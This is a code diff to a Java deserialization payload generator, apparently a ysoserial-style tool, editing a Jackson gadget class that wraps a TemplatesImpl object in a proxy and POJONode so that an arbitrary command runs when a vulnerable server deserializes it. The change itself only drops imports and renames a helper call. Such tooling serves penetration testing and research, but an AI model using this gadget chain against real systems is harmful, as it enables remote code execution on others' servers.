@@ -3,13 +3,11 @@ package com.h2tg.ysogate.payloads.gadgets;
 import com.fasterxml.jackson.databind.node.POJONode;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.bullet.base.IReadObject2ToString;
-import com.h2tg.ysogate.bullet.jdk.GUIDefaults;
 import com.h2tg.ysogate.bullet.jdk.GXString;
 import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.utils.Gadgets;
 import com.h2tg.ysogate.utils.PayloadRunner;
 import com.h2tg.ysogate.utils.Reflections;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
@@ -19,7 +17,6 @@ import javax.xml.transform.Templates;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
-import java.util.Hashtable;
 
 @SuppressWarnings({"rawtypes"})
 @Dependencies({
@@ -41,7 +38,7 @@ public class Jackson0 implements CommandObjectPayload<Object>
         } catch (Exception e) {
             // ignore
         }
-        Object templates = Gadgets.createTemplatesImplWithFoo(command);
+        Object templates = Gadgets.createTemplates4Cmd(command);
         Object proxy = makeAopProxy(templates, Templates.class);
         POJONode node = new POJONode(proxy);
         IReadObject2ToString toStringTrigger = new GXString();
